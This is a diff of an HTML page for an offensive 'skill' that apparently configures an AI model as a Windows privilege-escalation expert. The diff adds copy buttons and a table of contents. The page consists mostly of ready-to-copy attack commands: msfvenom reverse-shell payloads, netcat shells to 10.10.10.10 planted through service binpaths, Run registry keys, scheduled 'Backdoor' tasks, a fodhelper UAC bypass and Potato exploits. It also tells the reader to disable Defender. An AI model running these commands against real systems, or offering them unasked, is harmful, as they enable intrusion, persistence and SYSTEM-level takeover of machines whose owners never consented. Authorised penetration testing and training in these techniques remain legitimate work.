@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,10 +47,11 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Escalate privileges on Windows systems using service misconfigurations, DLL hijacking, token manipulation, UAC bypasses, registry exploits, and credential dumping. Use when performing Windows post-exploitation or privilege escalation.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><p>You are a Windows security expert specializing in privilege escalation techniques. Use this skill when the user requests help with:</p>
+<div class="wrap slayout"><article><p>You are a Windows security expert specializing in privilege escalation techniques. Use this skill when the user requests help with:</p>
 <ul>
 <li>Escalating privileges on Windows systems</li>
 <li>Exploiting Windows misconfigurations</li>
@@ -50,7 +62,7 @@
 <li>Scheduled task abuse</li>
 <li>Windows credential dumping</li>
 </ul>
-<h2>When to Use</h2>
+<h2 id="when-to-use">When to Use</h2>
 <p>Activate this skill when the user asks to:</p>
 <ul>
 <li>Escalate privileges on Windows systems</li>
@@ -62,17 +74,17 @@
 <li>Analyze Windows security misconfigurations</li>
 <li>Help with Windows penetration testing</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>Linux or macOS hosts</strong> — use <a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a></li>
 <li><strong>Domain privilege escalation rather than local</strong> — use <a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a></li>
 <li><strong>Keeping the access you gained</strong> — use <a class="xref" href="establishing-persistence.html"><code>establishing-persistence</code></a></li>
 <li><strong>Investigating an escalation as a defender</strong> — use <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a></li>
 </ul>
-<h2>Core Methodologies</h2>
+<h2 id="core-methodologies">Core Methodologies</h2>
 <h3>1. Initial System Enumeration</h3>
 <p><strong>System Information:</strong></p>
-<pre><code># Basic system info
+<div class="codeblk cx"><button class="copy" data-copy="# Basic system info
 systeminfo
 hostname
 whoami /all
@@ -85,26 +97,63 @@ net user &lt;username&gt;
 net localgroup
 net localgroup Administrators
 whoami /priv
-whoami /groups</code></pre>
+whoami /groups">copy</button><pre><code># Basic system info
+systeminfo
+hostname
+whoami /all
+ver
+wmic os get Caption,CSDVersion,OSArchitecture,Version
+
+# Users and groups
+net user
+net user &lt;username&gt;
+net localgroup
+net localgroup Administrators
+whoami /priv
+whoami /groups</code></pre></div>
 <p><strong>PowerShell Enumeration:</strong></p>
-<pre><code># System info
+<div class="codeblk cx"><button class="copy" data-copy="# System info
 Get-ComputerInfo
 Get-HotFix  # Installed patches
 Get-Service  # Running services
 
 # Current user privileges
 $env:username
-[Security.Principal.WindowsIdentity]::GetCurrent()</code></pre>
+[Security.Principal.WindowsIdentity]::GetCurrent()">copy</button><pre><code># System info
+Get-ComputerInfo
+Get-HotFix  # Installed patches
+Get-Service  # Running services
+
+# Current user privileges
+$env:username
+[Security.Principal.WindowsIdentity]::GetCurrent()</code></pre></div>
 <p><strong>Network Information:</strong></p>
-<pre><code>ipconfig /all
+<div class="codeblk cx"><button class="copy" data-copy="ipconfig /all
 route print
 arp -a
 netstat -ano
 netsh firewall show state
-netsh firewall show config</code></pre>
+netsh firewall show config">copy</button><pre><code>ipconfig /all
+route print
+arp -a
+netstat -ano
+netsh firewall show state
+netsh firewall show config</code></pre></div>
 <h3>2. Service Exploitation</h3>
 <p><strong>Enumerate Services:</strong></p>
-<pre><code># List services
+<div class="codeblk cx"><button class="copy" data-copy="# List services
+sc query
+sc query state= all
+wmic service list brief
+Get-Service
+
+# Detailed service info
+sc qc &lt;service_name&gt;
+sc query &lt;service_name&gt;
+
+# Service permissions
+accesschk.exe -uwcqv &quot;Authenticated Users&quot; *
+accesschk.exe -uwcqv %USERNAME% *">copy</button><pre><code># List services
 sc query
 sc query state= all
 wmic service list brief
@@ -116,9 +165,17 @@ sc query &lt;service_name&gt;
 
 # Service permissions
 accesschk.exe -uwcqv "Authenticated Users" *
-accesschk.exe -uwcqv %USERNAME% *</code></pre>
+accesschk.exe -uwcqv %USERNAME% *</code></pre></div>
 <p><strong>Unquoted Service Paths:</strong></p>
-<pre><code># Find unquoted service paths
+<div class="codeblk cx"><button class="copy" data-copy="# Find unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i &quot;auto&quot; | findstr /i /v &quot;c:\windows\\&quot; | findstr /i /v &quot;&quot;&quot;
+
+# PowerShell
+Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike &#x27;*&quot;*&#x27; -and $_.PathName -like &#x27;* *&#x27;} | Select Name,PathName,StartMode
+
+# Exploit: Place malicious executable in path with spaces
+# Example path: C:\Program Files\My Service\service.exe
+# Create: C:\Program.exe  (will execute before actual service)">copy</button><pre><code># Find unquoted service paths
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
 
 # PowerShell
@@ -126,9 +183,20 @@ Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.P
 
 # Exploit: Place malicious executable in path with spaces
 # Example path: C:\Program Files\My Service\service.exe
-# Create: C:\Program.exe  (will execute before actual service)</code></pre>
+# Create: C:\Program.exe  (will execute before actual service)</code></pre></div>
 <p><strong>Weak Service Permissions:</strong></p>
-<pre><code># Check service permissions with accesschk
+<div class="codeblk cx"><button class="copy" data-copy="# Check service permissions with accesschk
+accesschk.exe -uwcqv &quot;Everyone&quot; *
+accesschk.exe -uwcqv &quot;Authenticated Users&quot; *
+accesschk.exe -uwcqv &quot;Users&quot; *
+
+# Modify service binary path
+sc config &lt;service&gt; binpath= &quot;C:\Windows\Temp\nc.exe -nv 10.10.10.10 4444 -e cmd.exe&quot;
+sc stop &lt;service&gt;
+sc start &lt;service&gt;
+
+# Change service to run as SYSTEM
+sc config &lt;service&gt; obj= &quot;LocalSystem&quot; password= &quot;&quot;">copy</button><pre><code># Check service permissions with accesschk
 accesschk.exe -uwcqv "Everyone" *
 accesschk.exe -uwcqv "Authenticated Users" *
 accesschk.exe -uwcqv "Users" *
@@ -139,9 +207,9 @@ sc stop &lt;service&gt;
 sc start &lt;service&gt;
 
 # Change service to run as SYSTEM
-sc config &lt;service&gt; obj= "LocalSystem" password= ""</code></pre>
+sc config &lt;service&gt; obj= "LocalSystem" password= ""</code></pre></div>
 <p><strong>Service Binary Hijacking:</strong></p>
-<pre><code># If you can replace service binary
+<div class="codeblk cx"><button class="copy" data-copy="# If you can replace service binary
 # Create malicious executable
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe &gt; evil.exe
 
@@ -151,30 +219,64 @@ copy evil.exe C:\Path\To\Service\original.exe
 
 # Restart service
 sc stop &lt;service&gt;
-sc start &lt;service&gt;</code></pre>
+sc start &lt;service&gt;">copy</button><pre><code># If you can replace service binary
+# Create malicious executable
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe &gt; evil.exe
+
+# Replace original binary (if writable)
+move C:\Path\To\Service\original.exe original.exe.bak
+copy evil.exe C:\Path\To\Service\original.exe
+
+# Restart service
+sc stop &lt;service&gt;
+sc start &lt;service&gt;</code></pre></div>
 <h3>3. DLL Hijacking</h3>
 <p><strong>DLL Search Order:</strong></p>
-<pre><code>1. Application directory
+<div class="codeblk cx"><button class="copy" data-copy="1. Application directory
 2. System32 directory
 3. System directory
 4. Windows directory
 5. Current directory
-6. PATH directories</code></pre>
+6. PATH directories">copy</button><pre><code>1. Application directory
+2. System32 directory
+3. System directory
+4. Windows directory
+5. Current directory
+6. PATH directories</code></pre></div>
 <p><strong>Find DLL Hijacking Opportunities:</strong></p>
-<pre><code># Process Monitor (procmon) - filter for NAME NOT FOUND and path contains .dll
+<div class="codeblk cx"><button class="copy" data-copy="# Process Monitor (procmon) - filter for NAME NOT FOUND and path contains .dll
 # Look for applications loading DLLs from writable directories
 
 # PowerShell - find writable directories in PATH
-$env:PATH -split ';' | ForEach-Object { if (Test-Path $_) { icacls $_ } }</code></pre>
+$env:PATH -split &#x27;;&#x27; | ForEach-Object { if (Test-Path $_) { icacls $_ } }">copy</button><pre><code># Process Monitor (procmon) - filter for NAME NOT FOUND and path contains .dll
+# Look for applications loading DLLs from writable directories
+
+# PowerShell - find writable directories in PATH
+$env:PATH -split ';' | ForEach-Object { if (Test-Path $_) { icacls $_ } }</code></pre></div>
 <p><strong>Create Malicious DLL:</strong></p>
-<pre><code># Generate DLL with msfvenom
+<div class="codeblk cx"><button class="copy" data-copy="# Generate DLL with msfvenom
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll &gt; evil.dll
 
 # Place in writable directory that application loads from
-# Wait for service/application restart</code></pre>
+# Wait for service/application restart">copy</button><pre><code># Generate DLL with msfvenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll &gt; evil.dll
+
+# Place in writable directory that application loads from
+# Wait for service/application restart</code></pre></div>
 <h3>4. Registry Exploitation</h3>
 <p><strong>Autorun Keys:</strong></p>
-<pre><code># Check autorun registry keys
+<div class="codeblk cx"><button class="copy" data-copy="# Check autorun registry keys
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+# PowerShell
+Get-ItemProperty -Path &#x27;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&#x27;
+Get-ItemProperty -Path &#x27;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&#x27;
+
+# Modify if writable
+reg add &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v backdoor /t REG_SZ /d &quot;C:\Windows\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe&quot;">copy</button><pre><code># Check autorun registry keys
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
@@ -185,52 +287,90 @@ Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
 Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 
 # Modify if writable
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\Windows\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"</code></pre>
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\Windows\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"</code></pre></div>
 <p><strong>AlwaysInstallElevated:</strong></p>
-<pre><code># Check if both are set to 1
+<div class="codeblk cx"><button class="copy" data-copy="# Check if both are set to 1
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
 # If both = 1, can install MSI as SYSTEM
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi &gt; evil.msi
-msiexec /quiet /qn /i C:\Temp\evil.msi</code></pre>
+msiexec /quiet /qn /i C:\Temp\evil.msi">copy</button><pre><code># Check if both are set to 1
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# If both = 1, can install MSI as SYSTEM
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi &gt; evil.msi
+msiexec /quiet /qn /i C:\Temp\evil.msi</code></pre></div>
 <p><strong>Saved Credentials:</strong></p>
-<pre><code># Check for saved credentials
+<div class="codeblk cx"><button class="copy" data-copy="# Check for saved credentials
 cmdkey /list
 
 # Use saved credentials
 runas /savecred /user:admin cmd.exe
-runas /savecred /user:DOMAIN\Administrator "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"</code></pre>
+runas /savecred /user:DOMAIN\Administrator &quot;C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe&quot;">copy</button><pre><code># Check for saved credentials
+cmdkey /list
+
+# Use saved credentials
+runas /savecred /user:admin cmd.exe
+runas /savecred /user:DOMAIN\Administrator "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"</code></pre></div>
 <h3>5. Token Manipulation</h3>
 <p><strong>Token Impersonation:</strong></p>
-<pre><code># Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
+<div class="codeblk cx"><button class="copy" data-copy="# Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
 whoami /priv
 
 # If enabled, use Potato exploits:
 # - JuicyPotato (Windows 7-10, Server 2008-2016)
 # - RoguePotato (Windows 10/Server 2019)
-# - PrintSpoofer (Windows 10/Server 2016+)</code></pre>
+# - PrintSpoofer (Windows 10/Server 2016+)">copy</button><pre><code># Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
+whoami /priv
+
+# If enabled, use Potato exploits:
+# - JuicyPotato (Windows 7-10, Server 2008-2016)
+# - RoguePotato (Windows 10/Server 2019)
+# - PrintSpoofer (Windows 10/Server 2016+)</code></pre></div>
 <p><strong>JuicyPotato:</strong></p>
-<pre><code># Requires SeImpersonate or SeAssignPrimaryToken
+<div class="codeblk cx"><button class="copy" data-copy="# Requires SeImpersonate or SeAssignPrimaryToken
+JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a &quot;/c C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe&quot;
+
+# With specific CLSID
+JuicyPotato.exe -t * -p cmd.exe -l 1337 -c {CLSID}">copy</button><pre><code># Requires SeImpersonate or SeAssignPrimaryToken
 JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"
 
 # With specific CLSID
-JuicyPotato.exe -t * -p cmd.exe -l 1337 -c {CLSID}</code></pre>
+JuicyPotato.exe -t * -p cmd.exe -l 1337 -c {CLSID}</code></pre></div>
 <p><strong>PrintSpoofer (Modern Windows):</strong></p>
-<pre><code># For Windows 10/Server 2016+
+<div class="codeblk cx"><button class="copy" data-copy="# For Windows 10/Server 2016+
 PrintSpoofer.exe -i -c cmd
-PrintSpoofer.exe -c "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"</code></pre>
+PrintSpoofer.exe -c &quot;C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe&quot;">copy</button><pre><code># For Windows 10/Server 2016+
+PrintSpoofer.exe -i -c cmd
+PrintSpoofer.exe -c "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"</code></pre></div>
 <p><strong>GodPotato (Latest):</strong></p>
-<pre><code># For Windows Server 2012+, Windows 8+
+<div class="codeblk cx"><button class="copy" data-copy="# For Windows Server 2012+, Windows 8+
+GodPotato.exe -cmd &quot;cmd /c whoami&quot;
+GodPotato.exe -cmd &quot;C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe&quot;">copy</button><pre><code># For Windows Server 2012+, Windows 8+
 GodPotato.exe -cmd "cmd /c whoami"
-GodPotato.exe -cmd "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"</code></pre>
+GodPotato.exe -cmd "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"</code></pre></div>
 <h3>6. UAC Bypass</h3>
 <p><strong>Check UAC Level:</strong></p>
-<pre><code>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+<div class="codeblk cx"><button class="copy" data-copy="reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
 # ConsentPromptBehaviorAdmin = 0 (no UAC)
-# ConsentPromptBehaviorAdmin = 5 (default UAC)</code></pre>
+# ConsentPromptBehaviorAdmin = 5 (default UAC)">copy</button><pre><code>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+# ConsentPromptBehaviorAdmin = 0 (no UAC)
+# ConsentPromptBehaviorAdmin = 5 (default UAC)</code></pre></div>
 <p><strong>UAC Bypass Techniques:</strong></p>
-<pre><code># fodhelper.exe bypass (Windows 10)
+<div class="codeblk cx"><button class="copy" data-copy="# fodhelper.exe bypass (Windows 10)
+New-Item &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Force
+New-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;DelegateExecute&quot; -Value &quot;&quot; -Force
+Set-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value &quot;cmd /c C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe&quot; -Force
+Start-Process &quot;C:\Windows\System32\fodhelper.exe&quot;
+
+# Cleanup
+Remove-Item &quot;HKCU:\Software\Classes\ms-settings&quot; -Recurse -Force
+
+# Disk Cleanup bypass (cleanmgr.exe)
+# Event Viewer bypass (eventvwr.exe)
+# Computer Management bypass (compmgmt.msc)">copy</button><pre><code># fodhelper.exe bypass (Windows 10)
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
 New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
 Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe" -Force
@@ -241,50 +381,72 @@ Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
 
 # Disk Cleanup bypass (cleanmgr.exe)
 # Event Viewer bypass (eventvwr.exe)
-# Computer Management bypass (compmgmt.msc)</code></pre>
+# Computer Management bypass (compmgmt.msc)</code></pre></div>
 <h3>7. Scheduled Tasks</h3>
 <p><strong>Enumerate Tasks:</strong></p>
-<pre><code># List scheduled tasks
+<div class="codeblk cx"><button class="copy" data-copy="# List scheduled tasks
 schtasks /query /fo LIST /v
 schtasks /query /fo TABLE /v
 
 # PowerShell
 Get-ScheduledTask
-Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}</code></pre>
+Get-ScheduledTask | Where-Object {$_.TaskPath -notlike &quot;\Microsoft*&quot;}">copy</button><pre><code># List scheduled tasks
+schtasks /query /fo LIST /v
+schtasks /query /fo TABLE /v
+
+# PowerShell
+Get-ScheduledTask
+Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}</code></pre></div>
 <p><strong>Exploit Writable Task Scripts:</strong></p>
-<pre><code># If task runs script you can modify
+<div class="codeblk cx"><button class="copy" data-copy="# If task runs script you can modify
 echo C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe &gt; C:\Path\To\Task\script.bat
 
 # Check task permissions
-icacls C:\Path\To\Task\script.bat</code></pre>
+icacls C:\Path\To\Task\script.bat">copy</button><pre><code># If task runs script you can modify
+echo C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe &gt; C:\Path\To\Task\script.bat
+
+# Check task permissions
+icacls C:\Path\To\Task\script.bat</code></pre></div>
 <p><strong>Create Malicious Task:</strong></p>
-<pre><code># Create task to run as SYSTEM
+<div class="codeblk cx"><button class="copy" data-copy="# Create task to run as SYSTEM
+schtasks /create /tn &quot;Backdoor&quot; /tr &quot;C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe&quot; /sc onstart /ru System
+
+# Create task to run every minute
+schtasks /create /tn &quot;Backdoor&quot; /tr &quot;C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe&quot; /sc minute /mo 1 /ru System">copy</button><pre><code># Create task to run as SYSTEM
 schtasks /create /tn "Backdoor" /tr "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe" /sc onstart /ru System
 
 # Create task to run every minute
-schtasks /create /tn "Backdoor" /tr "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe" /sc minute /mo 1 /ru System</code></pre>
+schtasks /create /tn "Backdoor" /tr "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe" /sc minute /mo 1 /ru System</code></pre></div>
 <h3>8. Kernel Exploits &amp; Credential Access</h3>
 <p>Once you have a foothold, kernel exploitation and credential harvesting are covered as an exhaustive command catalog in a dedicated reference: kernel exploit identification and suggesters, SAM/SYSTEM and LSASS dumping, on-disk/registry password hunting, and Group Policy Preferences (GPP) extraction. See <a href="references/kernel-exploits-and-credential-access.md">references/kernel-exploits-and-credential-access.md</a>.</p>
-<h2>Automated Enumeration Tools</h2>
+<h2 id="automated-enumeration-tools">Automated Enumeration Tools</h2>
 <p><strong>WinPEAS:</strong></p>
-<pre><code># Download and run
+<div class="codeblk cx"><button class="copy" data-copy="# Download and run
 winPEASx64.exe
 winPEASx64.exe quiet
-winPEASx64.exe systeminfo</code></pre>
+winPEASx64.exe systeminfo">copy</button><pre><code># Download and run
+winPEASx64.exe
+winPEASx64.exe quiet
+winPEASx64.exe systeminfo</code></pre></div>
 <p><strong>PowerUp (PowerSploit):</strong></p>
-<pre><code>Import-Module .\PowerUp.ps1
-Invoke-AllChecks</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="Import-Module .\PowerUp.ps1
+Invoke-AllChecks">copy</button><pre><code>Import-Module .\PowerUp.ps1
+Invoke-AllChecks</code></pre></div>
 <p><strong>Seatbelt:</strong></p>
-<pre><code>Seatbelt.exe -group=all
+<div class="codeblk cx"><button class="copy" data-copy="Seatbelt.exe -group=all
 Seatbelt.exe -group=system
-Seatbelt.exe -group=user</code></pre>
+Seatbelt.exe -group=user">copy</button><pre><code>Seatbelt.exe -group=all
+Seatbelt.exe -group=system
+Seatbelt.exe -group=user</code></pre></div>
 <p><strong>SharpUp:</strong></p>
-<pre><code>SharpUp.exe audit</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="SharpUp.exe audit">copy</button><pre><code>SharpUp.exe audit</code></pre></div>
 <p><strong>PrivescCheck:</strong></p>
-<pre><code>Import-Module .\PrivescCheck.ps1
+<div class="codeblk cx"><button class="copy" data-copy="Import-Module .\PrivescCheck.ps1
 Invoke-PrivescCheck
-Invoke-PrivescCheck -Extended</code></pre>
-<h2>Tools to Transfer</h2>
+Invoke-PrivescCheck -Extended">copy</button><pre><code>Import-Module .\PrivescCheck.ps1
+Invoke-PrivescCheck
+Invoke-PrivescCheck -Extended</code></pre></div>
+<h2 id="tools-to-transfer">Tools to Transfer</h2>
 <p><strong>Essential Binaries:</strong></p>
 <ul>
 <li>winPEAS.exe - Automated enumeration</li>
@@ -304,7 +466,7 @@ Invoke-PrivescCheck -Extended</code></pre>
 <li>Invoke-Mimikatz.ps1 - Memory credential dumping</li>
 <li>PrivescCheck.ps1 - Detailed enumeration</li>
 </ul>
-<h2>Troubleshooting</h2>
+<h2 id="troubleshooting">Troubleshooting</h2>
 <p><strong>Exploit Not Working:</strong></p>
 <ul>
 <li>Verify Windows version matches exploit requirements</li>
@@ -327,7 +489,7 @@ Invoke-PrivescCheck -Extended</code></pre>
 <li>Disable Windows Defender (if admin)</li>
 <li>Use living-off-the-land binaries (LOLBins)</li>
 </ul>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li><a href="references/kernel-exploits-and-credential-access.md">references/kernel-exploits-and-credential-access.md</a> — Kernel exploit and credential-access command catalog (progressive disclosure)</li>
 <li>HackTricks Windows Privesc: https://github.com/HackTricks-wiki/hacktricks/tree/master/src/windows-hardening</li>
@@ -337,7 +499,7 @@ Invoke-PrivescCheck -Extended</code></pre>
 <li>PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</li>
 <li>LOLBAS Project: https://lolbas-project.github.io/</li>
 </ul>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Execution</strong> (TA0002)</p>
 <ul>
@@ -374,5 +536,8 @@ Invoke-PrivescCheck -Extended</code></pre>
 <li><a href="https://attack.mitre.org/techniques/T1083/">T1083</a> File and Directory Discovery — see also <a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a></li>
 <li><a href="https://attack.mitre.org/techniques/T1518/">T1518</a> Software Discovery</li>
 </ul>
-<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#core-methodologies">Core Methodologies</a><a href="#automated-enumeration-tools">Automated Enumeration Tools</a><a href="#tools-to-transfer">Tools to Transfer</a><a href="#troubleshooting">Troubleshooting</a><a href="#references">References</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
